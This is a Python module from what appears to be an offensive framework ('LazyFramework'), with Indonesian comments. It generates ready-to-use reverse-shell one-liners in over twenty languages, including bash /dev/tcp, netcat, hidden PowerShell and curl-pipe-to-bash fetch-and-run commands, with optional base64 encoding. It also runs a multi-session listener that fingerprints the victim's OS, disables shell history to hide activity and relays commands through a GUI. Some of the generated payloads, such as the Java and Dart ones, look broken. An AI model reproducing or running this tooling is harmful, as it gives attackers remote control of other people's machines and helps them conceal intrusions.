#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LazyFramework - Reverse TCP Multi-Language 22+
FIXED: Session auto-detection untuk GUI PyQt6
"""
import os
import sys
import socket
import struct
import threading
import time
import select
import base64
#from tkinter.filedialog import FileDialog
#from numpy import size
from rich.console import Console
import atexit
from rich.panel import Panel
from PyQt6.QtWidgets import QProgressBar, QDialog, QVBoxLayout, QLabel, QPushButton
from PyQt6.QtCore import QTimer
console = Console()

SESSIONS = {}
SESSIONS_LOCK = threading.Lock()

# ==================== WAJIB UNTUK gui.py ====================
MODULE_INFO = {
    "name": "Reverse TCP Multi-Language (22+)",
    "description": "Reverse shell 22+ bahasa + auto session detection",
    "author": "LazyFramework Indo",
    "rank": "Excellent"
}

OPTIONS = {
    "LHOST":   {"default": "0.0.0.0", "required": True},
    "LPORT":   {"default": 4444,      "required": True},
    "PAYLOAD": {"default": "python",  "required": True},
    "OUTPUT":  {"default": "",        "required": False},
    "ENCODE":  {"default": "no",      "required": False}
}
# =============================================================

def generate_payload(lhost, lport, lang):
    payloads = {
        "python": f"""import socket,os,pty,time
while True:
 try:
  s=socket.socket();s.connect(("{lhost}",{lport}))
  [os.dup2(s.fileno(),f) for f in (0,1,2)]
  pty.spawn("/bin/bash")
  s.send(b"stty raw -echo; clear\\n")
  s.send(b"export PS1=\\n")
 except: time.sleep(5)""",

        "bash": f"""bash -i >& /dev/tcp/{lhost}/{lport} 0>&1""",
        "nc": f"""rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f""",
        "php": f"""<?php set_time_limit(0);$s=fsockopen("{lhost}",{lport});$p=proc_open("/bin/sh -i",[0=>$s,1=>$s,2=>$s],$x);?>""",
        "perl": f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
        "ruby": f"""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'""",
        "netcat": f"""nc -e /bin/sh {lhost} {lport}""",
        "powershell": f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
        "awk": f"""awk 'BEGIN {{s = "/inet/tcp/0/{lhost}/{lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null""",
        "java": f"""public class Reverse {{ public static void main(String[] args) {{ try {{ Runtime r = Runtime.getRuntime(); Process p = r.exec("/bin/bash"); String cmd = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"; p.getOutputStream().write(cmd.getBytes()); p.getOutputStream().close(); }} catch(Exception e) {{}} }} }}""",
        "lua": f"""lua -e "require('socket');require('os');t=socket.tcp();t:connect('{lhost}',{lport});os.execute('/bin/sh -i <&3 >&3 2>&3');" """,
        "nodejs": f"""node -e "require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')" """,
        "go": f"""echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{lhost}:{lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go""",
        "wget": f"""wget -qO- http://{lhost}:{lport}/shell.sh | bash""",
        "curl": f"""curl http://{lhost}:{lport}/shell.sh | bash""",
        "telnet": f"""telnet {lhost} {lport} | /bin/sh | telnet {lhost} {lport}""",
        "socat": f"""socat TCP:{lhost}:{lport} EXEC:/bin/bash""",
        "dart": f"""dart -e 'import "dart:io";Process.start("/bin/bash", []).then((p) {{p.stdin.transform(systemEncoding.decoder).listen(print);}})'""",
        "rust": f"""use std::net::TcpStream;use std::process::Command;use std::os::unix::io::{{FromRawFd, IntoRawFd}};fn main(){{let s = TcpStream::connect("{lhost}:{lport}").unwrap();let fd = s.into_raw_fd();unsafe{{Command::new("/bin/sh").stdin(std::os::unix::io::FromRawFd::from_raw_fd(fd)).stdout(std::os::unix::io::FromRawFd::from_raw_fd(fd)).stderr(std::os::unix::io::FromRawFd::from_raw_fd(fd)).spawn().unwrap().wait().unwrap();}}}}""",
        "c": f"""#include <stdio.h>#include <sys/socket.h>#include <netinet/in.h>#include <unistd.h>int main(){{int s;struct sockaddr_in a={{AF_INET,htons({lport}),inet_addr("{lhost}")}};s=socket(AF_INET,SOCK_STREAM,0);connect(s,(struct sockaddr*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execl("/bin/sh","sh",0);}}""",
        "windows": f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
    }
    return payloads.get(lang.lower(), "# Payload tidak ada")

def get_local_ip():
    """Auto-detect IP yang bisa diakses dari luar (TUN/TAP, eth0, wlan0, dll)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def safe_gui_update(gui_instance, method_name, *args):
    """Thread-safe GUI update untuk PyQt6"""
    if not gui_instance:
        return

    try:
        # PyQt6
        from PyQt6.QtCore import QTimer
        QTimer.singleShot(0, lambda: getattr(gui_instance, method_name)(*args) if hasattr(gui_instance, method_name) else None)
    except Exception as e:
        pass

# Tambahkan fungsi ini di reverse_tcp.py setelah SESSIONS_LOCK

def sync_session_to_gui(sess_id, session_data, framework_session):
    """Sync session data to GUI secara real-time"""
    try:
        gui_sessions = framework_session.get('gui_sessions', {})
        if not gui_sessions:
            return False
            
        sessions_dict = gui_sessions.get('dict', {})
        sessions_lock = gui_sessions.get('lock')
        
        if sessions_lock:
            with sessions_lock:
                sessions_dict[sess_id] = session_data
        else:
            sessions_dict[sess_id] = session_data
            
        return True
    except:
        return False

def get_session_socket(sess_id, framework_session):
    """Dapatkan socket dari session - prioritaskan GUI sessions"""
    try:
        # Coba dari GUI sessions dulu
        gui_sessions = framework_session.get('gui_sessions', {})
        if gui_sessions:
            sessions_dict = gui_sessions.get('dict', {})
            sessions_lock = gui_sessions.get('lock')
            
            if sessions_lock:
                with sessions_lock:
                    session = sessions_dict.get(sess_id)
            else:
                session = sessions_dict.get(sess_id)
                
            if session and session.get('socket'):
                return session['socket']
        
        # Fallback ke reverse_tcp sessions
        with SESSIONS_LOCK:
            session = SESSIONS.get(sess_id)
            if session and session.get('socket'):
                return session['socket']
                
        return None
    except:
        return None


def sync_sessions_with_gui(framework_session):
    """Sync sessions between reverse_tcp dan GUI"""
    try:
        gui_sessions = framework_session.get('gui_sessions', {})
        if not gui_sessions or not isinstance(gui_sessions, dict):
            return
            
        sessions_dict = gui_sessions.get('dict', {})
        sessions_lock = gui_sessions.get('lock')
        
        # Sync dari reverse_tcp ke GUI
        with SESSIONS_LOCK:
            for sess_id, sess_data in SESSIONS.items():
                if sessions_lock:
                    with sessions_lock:
                        if sess_id not in sessions_dict:
                            sessions_dict[sess_id] = sess_data
                else:
                    if sess_id not in sessions_dict:
                        sessions_dict[sess_id] = sess_data
        
        # Sync dari GUI ke reverse_tcp (jika ada session di GUI tapi tidak di reverse_tcp)
        if sessions_lock:
            with sessions_lock:
                gui_session_ids = set(sessions_dict.keys())
        else:
            gui_session_ids = set(sessions_dict.keys())
            
        reverse_session_ids = set(SESSIONS.keys())
        
        missing_in_reverse = gui_session_ids - reverse_session_ids
        
    except Exception:
        pass

def send_command_to_session_with_gui(sess_id, command, framework_session):
    """Send command via GUI session data - NO ANSI VERSION"""
    # Cari session dari GUI sessions
    gui_sessions = framework_session.get('gui_sessions', {})
    if not gui_sessions:
        print(f"❌ No GUI sessions available")  # PAKAI PRINT BIASA
        return False
        
    sessions_dict = gui_sessions.get('dict', {})
    sessions_lock = gui_sessions.get('lock')
    
    # Get session dari GUI
    if sessions_lock:
        with sessions_lock:
            session = sessions_dict.get(sess_id)
    else:
        session = sessions_dict.get(sess_id)
        
    if not session:
        print(f"❌ Session {sess_id} not found in GUI sessions")  # PAKAI PRINT BIASA
        return False
        
    sock = session.get('socket')
    if not sock:
        print(f"❌ No socket in GUI session {sess_id}")  # PAKAI PRINT BIASA
        return False
        
    try:
        # Send command dengan newline
        full_command = command + "\n"
        bytes_sent = sock.send(full_command.encode())
        
        # Also update session output dengan command yang dikirim
        if sessions_lock:
            with sessions_lock:
                if sess_id in sessions_dict:
                    sessions_dict[sess_id]['output'] += f"$ {command}\n"
        else:
            if sess_id in sessions_dict:
                sessions_dict[sess_id]['output'] += f"$ {command}\n"
        
        # === PERBAIKAN: JANGAN PAKAI RICH CONSOLE ===
        print(f"✓ Command sent: {command}")  # PAKAI PRINT BIASA
        
        return True
        
    except Exception as e:
        print(f"❌ Send command error: {e}")  # PAKAI PRINT BIASA
        return False

def send_command_to_session(sess_id, command):
    """Kirim command ke session - SIMPLE VERSION"""
    try:
        with SESSIONS_LOCK:
            session = SESSIONS.get(sess_id)

        if not session:
            return False

        sock = session.get('socket')
        if not sock:
            return False

        # Send command sederhana
        full_command = command + "\n"
        sock.send(full_command.encode())
        return True
        
    except:
        return False





def is_windows_target(sock):
    """Deteksi OS target menggunakan platform module - CLEAN VERSION"""
    try:
        # Kirim command untuk deteksi OS
        sock.send("python3 -c \"import platform; print(platform.system())\"\n".encode())
        time.sleep(1)
        sock.settimeout(2)
        
        response = sock.recv(1024).decode('utf-8', errors='ignore').upper()
        
        # Cek hasil platform.system()
        if 'WINDOWS' in response:
            return True
        elif 'LINUX' in response or 'DARWIN' in response:  # Linux atau macOS
            return False
        
        # Fallback: coba uname
        sock.send("uname -s 2>/dev/null || echo 'UNKNOWN'\n".encode())
        time.sleep(0.5)
        sock.settimeout(1)
        
        uname_response = sock.recv(1024).decode('utf-8', errors='ignore').upper()
        
        if 'LINUX' in uname_response or 'DARWIN' in uname_response:
            return False
        elif 'CYGWIN' in uname_response or 'MINGW' in uname_response:
            return True  # Windows dengan Unix-like environment
            
        # Default assumption berdasarkan command availability
        sock.send("which powershell 2>/dev/null && echo 'WINDOWS' || echo 'LINUX'\n".encode())
        time.sleep(0.5)
        sock.settimeout(1)
        
        which_response = sock.recv(1024).decode('utf-8', errors='ignore').upper()
        
        return 'WINDOWS' in which_response
        
    except:
        # Jika semua gagal, default ke Linux (lebih umum)
        return False


def detect_target_os(sock):
    """Deteksi OS target dengan multiple methods"""
    try:
        # Method 1: Coba command uname (Linux/Mac)
        sock.send("uname -s 2>/dev/null && echo '||UNIX||' || echo '||UNKNOWN||'\n".encode())
        time.sleep(0.5)
        sock.settimeout(1)
        
        response = sock.recv(1024).decode('utf-8', errors='ignore').upper()
        
        if 'LINUX' in response:
            return 'linux'
        elif 'DARWIN' in response or 'MAC' in response:
            return 'macos'
        elif 'CYGWIN' in response or 'MINGW' in response:
            return 'windows'
        
        # Method 2: Coba command systeminfo (Windows)
        sock.send("systeminfo 2>nul | findstr /B /C:\"OS Name\" && echo '||WINDOWS||' || echo '||UNKNOWN||'\n".encode())
        time.sleep(0.5)
        sock.settimeout(1)
        
        response = sock.recv(1024).decode('utf-8', errors='ignore').upper()
        
        if 'WINDOWS' in response or 'MICROSOFT' in response:
            return 'windows'
        
        # Method 3: Cek existence of typical commands
        sock.send("which cmd.exe >nul 2>&1 && echo '||WINDOWS||' || which powershell >nul 2>&1 && echo '||WINDOWS||' || echo '||LINUX||'\n".encode())
        time.sleep(0.5)
        sock.settimeout(1)
        
        response = sock.recv(1024).decode('utf-8', errors='ignore').upper()
        
        if 'WINDOWS' in response:
            return 'windows'
        else:
            return 'linux'  # Default assumption
            
    except:
        return 'unknown'


def handler(client_sock, addr, framework_session):
    """Handle incoming reverse shell connections - STABLE VERSION"""
    sess_id = f"{addr[0]}:{addr[1]}"
    
    try:
        # Get GUI instance from framework session
        gui_instance = framework_session.get('gui_instance')
        gui_sessions = framework_session.get('gui_sessions', {})
        
        # Deteksi OS target
        target_os = detect_target_os(client_sock)
        
        # Session data dengan info OS
        session_data = {
            'id': sess_id,
            'socket': client_sock,
            'ip': addr[0],
            'port': addr[1],
            'rhost': addr[0],
            'rport': addr[1],
            'lhost': framework_session.get('LHOST', '0.0.0.0'),
            'lport': framework_session.get('LPORT', 4444),
            'type': 'reverse_tcp',
            'os': target_os,  # ← TAMBAH INI
            'cwd': '/',
            'output': f"[*] Session {sess_id} created\nType: reverse_tcp\nOS: {target_os}\nSource: {addr[0]}:{addr[1]}\n\n",
            'status': 'alive',
            'created': time.strftime("%H:%M:%S")
        }

        with SESSIONS_LOCK:
            SESSIONS[sess_id] = session_data
            
        # Simpan ke GUI sessions
        if gui_sessions and isinstance(gui_sessions, dict):
            sessions_dict = gui_sessions.get('dict', {})
            sessions_lock = gui_sessions.get('lock')
            
            if sessions_lock:
                with sessions_lock:
                    sessions_dict[sess_id] = session_data
            else:
                sessions_dict[sess_id] = session_data

        console.print(f"\n[bold green][+] Session {sess_id} opened (OS: {target_os.upper()})[/]")
        
        # Thread-safe GUI update
        safe_gui_update(gui_instance, "update_sessions_ui")
        safe_gui_update(gui_instance, "switch_to_sessions_tab")
        safe_gui_update(gui_instance, "update_session_info")
        safe_gui_update(gui_instance, "update_listener_status", True)
        safe_gui_update(gui_instance, "update_listener_status", False)



        # Setup shell berdasarkan OS
        try:
            time.sleep(0.5)
            
            if target_os == 'windows':
                setup_commands = [
                    "echo %CD%",
                    "whoami",
                    "ver"
                ]
            else:
                setup_commands = [
                    "unset HISTFILE",
                    "export TERM=xterm-256color", 
                    "export PS1='$ '",
                    "pwd",
                    "whoami",
                    "uname -a"
                ]
            
            for cmd in setup_commands:
                client_sock.send(f"{cmd}\n".encode())
                time.sleep(0.2)
        except:
            pass

        # Main handler loop
        buffer = ""
        while True:
            try:
                ready = select.select([client_sock], [], [], 0.3)
                if not ready[0]:
                    continue
                    
                data = client_sock.recv(4096)
                if not data: 
                    break
                        
                raw_output = data.decode('utf-8', errors='ignore')
                buffer += raw_output
                    
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    line = line.strip()
                        
                    if not line:
                        continue
                        
                    # Filter ANSI sequences
                    import re
                    clean_line = re.sub(r'\x1b\[[^a-zA-Z]*[a-zA-Z]', '', line)
                    clean_line = re.sub(r'\x1b\][0-9][;?].*?\x07', '', clean_line)
                    clean_line = re.sub(r'\x1b[=>?]', '', clean_line)
                    clean_line = clean_line.replace('␛[?2004h', '').replace('␛[?2004l', '')
                        
                    if not clean_line.strip():
                        continue
                            
                    skip_patterns = [
                        "export PS1", "leakos@leakos", 
                        "stty:", "alias ls=", "__CWD__:",
                        "␛[?2004", "?2004"
                    ]
                        
                    if any(pattern in line for pattern in skip_patterns):
                        continue
                        
                    if clean_line.strip():
                        # Update storage
                        with SESSIONS_LOCK:
                            if sess_id in SESSIONS:
                                SESSIONS[sess_id]['output'] += clean_line + "\n"
                            
                        # Update GUI
                        safe_gui_update(gui_instance, "append_session_output", sess_id, clean_line)
                            
            except (socket.error, ConnectionResetError, BrokenPipeError):
                break
            except Exception:
                continue
                
    except Exception as e:
        console.print(f"[red]❌ Handler error: {e}[/]")
    finally:
        # Cleanup
        try:
            with SESSIONS_LOCK:
                if sess_id in SESSIONS:
                    del SESSIONS[sess_id]
                    
            if 'gui_sessions' in framework_session:
                gui_sessions = framework_session.get('gui_sessions', {})
                if gui_sessions and isinstance(gui_sessions, dict):
                    sessions_dict = gui_sessions.get('dict', {})
                    sessions_lock = gui_sessions.get('lock')
                    if sessions_lock:
                        with sessions_lock:
                            if sess_id in sessions_dict:
                                del sessions_dict[sess_id]
                    else:
                        if sess_id in sessions_dict:
                            del sessions_dict[sess_id]
            
            safe_gui_update(gui_instance, "update_sessions_ui")
            safe_gui_update(gui_instance, "update_session_info")  # ← TAMBAH INI
            console.print(f"[yellow][-] Session {sess_id} closed[/]")
        except:
            pass

def clean_ansi_codes(text):
    """Remove ANSI escape sequences - SIMPLE BUT EFFECTIVE"""
    import re
    if not text:
        return text
    
    # Remove semua ANSI sequences termasuk color codes
    return re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', text)

def start_listener(lhost, lport, framework_session):
    """Start TCP listener"""
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((lhost, lport))
    s.listen(50)

    gui_instance = framework_session.get('gui_instance')
    
    # **TAMBAHKAN INI: Notify GUI tentang listener aktif**
    if gui_instance and hasattr(gui_instance, 'add_listener'):
        safe_gui_update(gui_instance, "add_listener", lhost, lport)
    
    # Output penting untuk GUI
    console.print(f"[bold cyan][*] Listening {lhost}:{lport} → Multi-Language + GUI Ready![/]")
    console.print(f"[bold yellow][!] Session akan otomatis muncul di tab Sessions ketika ada koneksi[/]")
    safe_gui_update(gui_instance, "update_session_info")
    try:
        while True:
            client, addr = s.accept()
            threading.Thread(
                target=handler, 
                args=(client, addr, framework_session), 
                daemon=True
            ).start()
    except KeyboardInterrupt:
        console.print("[yellow][!] Listener stopped[/]")
    except Exception as e:
        console.print(f"[red][!] Listener error: {e}[/]")
    finally:
        if gui_instance and hasattr(gui_instance, 'remove_listener'):
            safe_gui_update(gui_instance, "remove_listener", lhost, lport)
        try:
            s.close()
            safe_gui_update(gui_instance, "update_session_info")
        except:
            pass


def run(session, options):
    """Main module execution"""
    lhost = options.get("LHOST", "0.0.0.0")
    lport = int(options.get("LPORT", 4444))
    lang  = options.get("PAYLOAD", "python").lower()
    output = options.get("OUTPUT", "")
    encode = options.get("ENCODE", "no").lower() == "yes"

    # Simpan settings ke session untuk GUI
    session['LHOST'] = lhost
    session['LPORT'] = lport

    payload = generate_payload(lhost, lport, lang)

    if encode:
        payload = base64.b64encode(payload.encode()).decode()
        console.print("[yellow][*] Payload di-encode base64[/]")

    if output:
        ext = {
            "python": ".py", "bash": ".sh", "php": ".php", "perl": ".pl", 
            "ruby": ".rb", "powershell": ".ps1", "go": ".go", "rust": ".rs",
            "c": ".c", "java": ".java", "nodejs": ".js", "windows": ".ps1"
        }.get(lang, ".txt")
        path = output if output.endswith(ext) else output + ext
        with open(path, "w") as f:
            f.write(payload)
        console.print(f"[green][+] Payload saved → {path}[/]")

    console.print(Panel(payload, title=f"PAYLOAD {lang.upper()}", border_style="bright_blue"))

    # Start listener dalam thread terpisah
    listener_thread = threading.Thread(
        target=start_listener, 
        args=(lhost, lport, session), 
        daemon=True
    )
    listener_thread.start()
    
    console.print("[green][+] Reverse TCP listener started![/]")
    console.print("[bold yellow][!] Jalankan payload di target, session akan muncul otomatis di tab Sessions[/]")
